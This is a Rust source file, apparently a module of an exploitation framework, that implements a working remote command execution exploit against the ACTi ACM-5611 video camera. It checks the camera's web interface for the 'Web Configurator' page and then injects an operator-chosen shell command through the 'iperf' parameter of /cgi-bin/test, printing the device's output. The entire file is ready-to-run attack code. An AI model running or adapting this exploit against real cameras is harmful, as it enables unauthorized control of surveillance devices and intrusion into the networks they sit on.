use anyhow::{anyhow, Result};
use colored::*;
use reqwest::Client;
use std::io::{self, Write};
use std::time::Duration;

/// Executes an RCE on ACTi ACM-5611 Video Camera using command injection
/// Reference:
/// - https://www.exploitalert.com/view-details.html?id=34128
/// - https://packetstormsecurity.com/files/154626/ACTi-ACM-5611-Video-Camera-Remote-Command-Execution.html

/// Exploit authors:
/// - Todor Donev <todor.donev@gmail.com>
/// - GH0st3rs (RouterSploit module)

const DEFAULT_PORT: u16 = 8080;
const DEFAULT_TIMEOUT_SECS: u64 = 10;

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   ACTi ACM-5611 Video Camera RCE Exploit                  ║".cyan());
    println!("{}", "║   Command Injection via /cgi-bin/test                     ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}

pub async fn run(target: &str) -> Result<()> {
    display_banner();
    println!("{}", format!("[*] Target: {}", target).yellow());
    println!();

    // Prompt for port
    print!("{}", format!("Enter target port (default {}): ", DEFAULT_PORT).cyan().bold());
    io::stdout().flush()?;
    let mut port_input = String::new();
    io::stdin().read_line(&mut port_input)?;
    let port: u16 = port_input.trim().parse().unwrap_or(DEFAULT_PORT);

    println!("{}", format!("[*] Checking vulnerability on {}:{}...", target, port).yellow());

    if check(target, port).await? {
        println!("{}", format!("[+] Target appears vulnerable: {}:{}", target, port).green().bold());

        // Prompt for command to execute
        print!("{}", "Enter command to execute (default: id): ".cyan().bold());
        io::stdout().flush()?;
        let mut cmd_input = String::new();
        io::stdin().read_line(&mut cmd_input)?;
        let cmd = {
            let t = cmd_input.trim();
            if t.is_empty() { "id" } else { t }
        };

        println!("{}", format!("[*] Executing command: {}", cmd).cyan());
        let output = execute(target, port, cmd).await?;
        println!("{}", format!("[+] Output:\n{}", output).green());
    } else {
        println!("{}", format!("[-] Exploit failed - target {}:{} does not seem vulnerable", target, port).red());
    }

    Ok(())
}

/// Perform a command injection via GET /cgi-bin/test?iperf=;<cmd>
async fn execute(target: &str, port: u16, cmd: &str) -> Result<String> {
    let url = format!("http://{}:{}/cgi-bin/test", target, port);
    let client = Client::builder()
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()?;

    let res = client
        .get(&url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .header("Referer", format!("http://{}:{}", target, port))
        .query(&[("iperf", format!(";{}", cmd))])
        .send()
        .await?;

    if res.status().is_success() {
        let text = res.text().await?;
        Ok(text)
    } else {
        Err(anyhow!("Command execution failed, status code: {}", res.status()))
    }
}

/// Check if the target is running the vulnerable service
async fn check(target: &str, port: u16) -> Result<bool> {
    let url = format!("http://{}:{}/cgi-bin/test", target, port);
    let index_url = format!("http://{}:{}/", target, port);
    let client = Client::builder()
        .timeout(Duration::from_secs(DEFAULT_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()?;

    // Check /cgi-bin/test
    let test_res = client.get(&url).send().await?;
    if test_res.status().is_success() {
        println!("{}", "[*] CGI endpoint accessible".cyan());
        // Check root page contains 'Web Configurator'
        let index_res = client.get(&index_url).send().await?;
        if index_res.status().is_success() {
            let body = index_res.text().await?;
            if body.contains("Web Configurator") {
                println!("{}", "[*] ACTi Web Configurator detected".cyan());
                return Ok(true);
            }
        }
    }

    Ok(false)
}
